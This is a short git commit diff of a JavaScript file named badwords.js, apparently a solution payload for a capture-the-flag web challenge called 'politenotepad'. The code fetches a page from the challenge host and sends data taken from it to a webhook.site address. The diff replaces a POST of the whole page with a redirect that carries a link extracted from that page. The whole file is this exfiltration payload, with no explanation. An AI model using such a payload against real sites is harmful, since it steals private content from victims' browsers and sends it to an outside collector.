b58bb3c25d4c973d2543ab0a22f146c984250786
2xmd5hasgoneinsane <84242433+2xmd5hasgoneinsane@users.noreply.github.com>
2021-05-15 19:00:02 +0200

    Update badwords.js

--- badwords.js
+++ badwords.js
@@ -1,3 +1,5 @@
 fetch("http://politenotepad.zajebistyc.tf/").then( r => r.text() ).then( r =>
-	fetch("https://webhook.site/#!/f6ca6116-5afa-46f2-84b5-175025c85670/", {method:"POST", body:r})														  	
+
+window.location = "https://webhook.site/f6ca6116-5afa-46f2-84b5-175025c85670/"+
+new DOMParser().parseFromString(r, "text/html").querySelector('li:not([class]) > a').href.match( /[^\/]+$/ )[0]
 );
